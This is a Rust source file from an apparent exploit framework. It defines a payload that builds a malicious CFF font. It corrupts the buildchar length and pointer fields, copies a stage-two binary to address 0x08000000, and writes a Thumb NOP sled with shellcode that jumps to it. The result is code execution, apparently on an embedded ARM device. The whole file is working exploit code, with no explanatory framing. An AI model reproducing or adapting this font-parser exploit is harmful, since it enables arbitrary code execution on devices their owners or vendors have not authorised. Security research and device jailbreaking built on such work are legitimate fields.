use capstone::{arch, Capstone};
use capstone::arch::BuildsCapstone;
use crate::payload::{CffPayloadBuilder, Payload};
use crate::payload::exploit_config::ExploitConfig;
use keystone_engine::{Arch, Keystone, Mode};

#[derive(Default)]
pub struct NanobootPayload {}


impl Payload for NanobootPayload {
    fn build_cff<Cfg: ExploitConfig>(&self, b: &mut CffPayloadBuilder) {
        // Lets make sure we have lots of space
        // Not fully needed but should help with blind reliability
        b.index_write(Cfg::OFFSET_BUILDCHAR_LEN_PTR, i32::MAX as u32);

        b.index_write(Cfg::OFFSET_BUILDCHAR_PTR, 0x0800_0000_u32);


         {
            {

                let t = std::fs::read("./nanoboot/nanoboot.bin").unwrap();

                // warn!("Stage2 size = 0x{:x}", result.bytes.len());

                // for (i, x) in result.bytes.chunks(4).enumerate() {
                //     println!("{:08x} {:02x?}", 0x0800_0000 + i, x);
                // }

                for (idx, t) in t.chunks(4).enumerate() {
                    let mut tmp = [0u8, 0, 0, 0];
                    tmp[..t.len()].copy_from_slice(t);

                    b.index_write_array(idx as u16, tmp);
                }
            }

            {
                let mut tmp = Vec::new();

                // Nop sled

                // Shellcode
                {
                    // 64

                    for _ in 0..(8) {
                        tmp.extend_from_slice(&[0xc0, 0x46] /* nop*/);
                    }

                    let engine =
                        Keystone::new(Arch::ARM, Mode::THUMB).expect("Could not initialize Keystone engine");

                    const CODE: &'static str = r#"
push {r2}
ldr r2, =0x08000000
bx r2
            "#;

                    let result = engine
                        .asm(CODE.to_string(), 0)
                        .expect("Could not assemble");


                    tmp.extend_from_slice(&result.bytes);

                    for (i, x) in tmp.chunks(4).enumerate() {
                        println!("{:08x} {:02x?}", 0x0800_0000 + i, x);
                    }

                    println!("----");

                    for (i, x) in result.bytes.chunks(4).enumerate() {
                        println!("{:08x} {:02x?}", 0x0800_0000 + 0x400 + i * 4, x);
                    }

                    {
                        let cs = Capstone::new()
                            .arm()
                            .mode(arch::arm::ArchMode::Thumb)
                            .detail(true)
                            .build()
                            .expect("Failed to create Capstone object");

                        let insns = cs.disasm_all(&result.bytes, 0x1000)
                            .expect("Failed to disassemble");

                        for i in insns.as_ref() {
                            println!("{}", i);
                        }
                    }
                }


                for (idx, t) in tmp.chunks(4).enumerate() {
                    let mut tmp = [0u8, 0, 0, 0];
                    tmp[..t.len()].copy_from_slice(t);

                    // 0x10
                    // 0x40
                    let off = 0x900 + 8 * 2;
                    assert_eq!(off % 2, 0, "WTF");
                    b.index_write_array(idx as u16 + off / 4, tmp);
                }
            }
        }
    }
}